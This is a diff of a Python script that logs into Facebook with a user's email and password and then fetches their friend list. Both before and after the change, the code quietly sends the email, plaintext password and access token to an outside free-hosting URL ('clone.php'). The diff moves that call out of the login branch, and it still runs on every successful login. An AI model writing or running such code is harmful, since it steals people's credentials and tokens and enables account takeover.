@@ -20,10 +20,11 @@ op = json.load(data)
 if 'access_token' in op:
     token = (op["access_token"])
     print ("\033[39m[\033[31m+\033[39m] Login Succeed")
-    pd = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + token)
+    
 else:
     print ("\033[39m[\033[31m+\033[39m] \033[31mWrong Email Or Password")
     sys.exit()
+pd = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + token)
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
 hasil = json.loads(get_friends.text)
 print ("\033[39m[\033[31m+\033[39m] Frind list OK !!")
